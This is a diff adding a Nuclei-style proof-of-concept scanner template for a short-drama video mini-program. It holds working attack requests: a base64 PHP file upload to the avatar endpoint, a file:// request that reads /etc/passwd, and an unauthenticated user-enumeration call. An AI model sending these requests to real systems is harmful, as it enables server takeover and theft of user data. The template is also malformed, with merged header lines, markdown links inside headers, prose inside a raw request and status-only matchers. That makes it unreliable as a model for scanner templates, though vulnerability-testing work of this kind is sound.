@@ -1,0 +1,81 @@
+id: poc-twst1b20lnyua72h
+info:
+  name: 短剧影视小程序多个漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/twst1b20lnyua72h'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: twst1b20lnyua72h
+    fofa: '"/VwmRIfEYDH.php"'
+http:
+- raw:
+  - 'POST /api/user/avatar HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7Cache-Control: max-age=0
+
+    Connection: keep-alive
+
+    Content-Length: 73Content-Type: application/x-www-form-urlencoded
+
+    Cookie: PHPSESSID=qt0rrvopobbbvibu6f8p9lr42
+
+    rHost: 127.0.0.1
+
+    Origin: [http://127.0.0.1](http://127.0.0.1)
+
+    Referer: [http://127.0.0.1/api/user/avatar](http://127.0.0.1/api/user/avatar)
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+
+    base64=data:image/php;base64,YTw/cGhwIHBocGluZm8oKTs/Pg=='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /api/ems/juhecurl?url=file:///etc/passwd HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - '在 /api/controller/Index.php 控制器的index方法中，很明显地存在 where 查询网站信息及User表中的字段，并且将所有用户枚举出来，且因为 $noNeedLogin = [''*''] 导致所有接口都无权限验证
+
+
+    POST /api/index HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
